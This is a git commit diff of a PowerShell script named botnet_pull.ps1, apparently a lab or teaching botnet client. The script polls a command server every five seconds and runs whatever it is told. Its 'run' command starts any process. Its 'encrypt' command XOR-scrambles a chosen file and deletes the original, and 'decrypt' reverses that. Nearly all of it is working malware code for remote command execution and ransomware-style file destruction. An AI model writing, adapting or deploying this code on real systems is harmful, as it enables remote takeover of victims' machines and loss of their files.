5ef993dbbc3966625b6dba1dd8f83c37f7717b10
Jesus Enrique Pacheco Franco <jesus.pacheco@seguridad.unam.mx>
2019-10-18 18:51:22 -0500

    Implemented Repetitive Request and Added exit Feature

--- botnet_pull.ps1
+++ botnet_pull.ps1
@@ -1,42 +1,50 @@
 ### Global Variables ###
 
-    $commandResource = 'http://172.17.212.145/jesus.html' # Resource to be Consulted
-    $request = Invoke-WebRequest $commandResource         # Get the Resource
-    $command = $request.Content.Split(' ')                # Get Command Parts
-    [System.Collections.ArrayList] $encryptedFile = @()   # File's Bytes
+$commandResource = 'http://172.17.212.145/jesus.html' # Resource to be Consulted
 
-    switch ($command[0]) {
+while($true) {
 
-        "run" {
+        $request = Invoke-WebRequest $commandResource         # Get the Resource
+        $command = $request.Content.Split(' ')                # Get Command Parts
+        [System.Collections.ArrayList] $encryptedFile = @()   # File's Bytes
+
+        switch ($command[0]) {
+
+            "run" {
         
-            [Diagnostics.Process]::Start($command[1])
+                [Diagnostics.Process]::Start($command[1]) # Execute the Command
         
-        }
+            }
         
-        "encrypt" { # encrypt filePath
+            "encrypt" { # encrypt filePath
 
-            echo $command[1]
+                echo $command[1]
 
-            $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
-            $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
-            $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte
+                $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
+                $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
+                $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte
 
-            [System.IO.File]::WriteAllBytes("$fileAbsolutePath" + ".encrypted", $encryptedFile) # Create Encrypted File
-            Remove-Item $fileAbsolutePath # Delete Original File
+                [System.IO.File]::WriteAllBytes("$fileAbsolutePath" + ".encrypted", $encryptedFile) # Create Encrypted File
+                Remove-Item $fileAbsolutePath # Delete Original File
+
+            }
+
+            "decrypt" {
+
+                $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
+                $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
+                $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte
+
+                [System.IO.File]::WriteAllBytes($fileAbsolutePath.ProviderPath.Substring(0, $fileAbsolutePath.ProviderPath.Length - 10), $encryptedFile) # Create Encrypted File
+                Remove-Item $fileAbsolutePath # Delete Encrypted File
+
+            }
+
+            "hello" { echo "Hello\n" }
+
+            "exit" { exit }
 
         }
 
-        "decrypt" {
-
-            $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
-            $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
-            $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte
-
-            [System.IO.File]::WriteAllBytes($fileAbsolutePath.ProviderPath.Substring(0, $fileAbsolutePath.ProviderPath.Length - 10), $encryptedFile) # Create Encrypted File
-            Remove-Item $fileAbsolutePath # Delete Encrypted File
-
-        }
-
-        "greet" { echo "Hola Como Andamos" }
-
-    }
+        Start-Sleep -Seconds 5 # Get the Resource Every Certain Time
+}
